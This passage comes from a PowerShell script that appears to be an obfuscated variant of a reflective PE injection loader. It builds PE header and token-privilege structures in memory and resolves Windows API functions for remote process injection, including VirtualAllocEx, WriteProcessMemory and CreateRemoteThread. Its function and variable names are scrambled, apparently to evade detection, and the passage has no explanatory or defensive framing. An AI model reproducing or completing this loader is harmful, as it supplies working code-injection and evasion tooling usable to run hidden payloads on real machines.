        ($LHFSser.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($LHFSser.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($LHFSser.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($LHFSser.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($LHFSser.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($LHFSser.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($LHFSser.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($LHFSser.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($LHFSser.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($LHFSser.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($LHFSser.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($LHFSser.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($LHFSser.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($LHFSser.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($LHFSser.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($LHFSser.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($LHFSser.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($LHFSser.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($LHFSser.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($LHFSser.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64


        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $KSHDSDHA_a, [System.ValueType], 224)
        ($LHFSser.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($LHFSser.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($LHFSser.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($LHFSser.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($LHFSser.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($LHFSser.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($LHFSser.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($LHFSser.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($LHFSser.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($LHFSser.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($LHFSser.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($LHFSser.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($LHFSser.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($LHFSser.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($LHFSser.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($LHFSser.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($LHFSser.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($LHFSser.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($LHFSser.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($LHFSser.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($LHFSser.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($LHFSser.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($LHFSser.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($LHFSser.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($LHFSser.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($LHFSser.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($LHFSser.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($LHFSser.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($LHFSser.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($LHFSser.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($LHFSser.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($LHFSser.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($LHFSser.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($LHFSser.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($LHFSser.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($LHFSser.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($LHFSser.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($LHFSser.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($LHFSser.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($LHFSser.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($LHFSser.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($LHFSser.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($LHFSser.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($LHFSser.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($LHFSser.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($LHFSser.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32


        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $KSHDSDHA_a, [System.ValueType], 264)
        $LHFSser.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $LHFSser.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        

        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $KSHDSDHA_a, [System.ValueType], 248)
        $LHFSser.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $LHFSser.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32


        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $KSHDSDHA_a, [System.ValueType], 64)
        $LHFSser.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $LHFSser.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $LHFSser.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $LHFSser.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $LHFSser.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $LHFSser.CreateType()   
        $DJH32H | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER


        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $KSHDSDHA_a, [System.ValueType], 40)

        $nameField = $LHFSser.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $LHFSser.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER


        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $KSHDSDHA_a, [System.ValueType], 8)
        $LHFSser.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION


        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $KSHDSDHA_a, [System.ValueType], 20)
        $LHFSser.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('Name', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR


        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $KSHDSDHA_a, [System.ValueType], 40)
        $LHFSser.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('Name', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('Base', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        

        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('LUID', $KSHDSDHA_a, [System.ValueType], 8)
        $LHFSser.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        

        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $KSHDSDHA_a, [System.ValueType], 12)
        $LHFSser.DefineField('Luid', $LUID, 'Public') | Out-Null
        $LHFSser.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        

        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $KSHDSDHA_a, [System.ValueType], 16)
        $LHFSser.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $DJH32H
    }

    Function Get-WiSDGKDants
    {
        $WiSDGKDants = New-Object System.Object
        
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $WiSDGKDants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $WiSDGKDants
    }

    Function Get-l64ftion
    {
        $l64ftion = New-Object System.Object
        
        $VirtualAllocAddr = klsdjlkhfDjswpdy kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $l64ftion | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = klsdjlkhfDjswpdy kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $l64ftion | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = klsdjlkhfDjswpdy msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = klsdjlkhfDjswpdy msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = klsdjlkhfDjswpdy kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = klsdjlkhfDjswpdy kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressOrdinalAddr = klsdjlkhfDjswpdy kernel32.dll GetProcAddress
        $GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
        
        $VirtualFreeAddr = klsdjlkhfDjswpdy kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $l64ftion | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = klsdjlkhfDjswpdy kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $l64ftion | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = klsdjlkhfDjswpdy kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $l64ftion | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = klsdjlkhfDjswpdy kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $l64ftion | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = klsdjlkhfDjswpdy kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = klsdjlkhfDjswpdy kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = klsdjlkhfDjswpdy kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = klsdjlkhfDjswpdy kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = klsdjlkhfDjswpdy kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = klsdjlkhfDjswpdy kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = klsdjlkhfDjswpdy kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = klsdjlkhfDjswpdy Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = klsdjlkhfDjswpdy kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
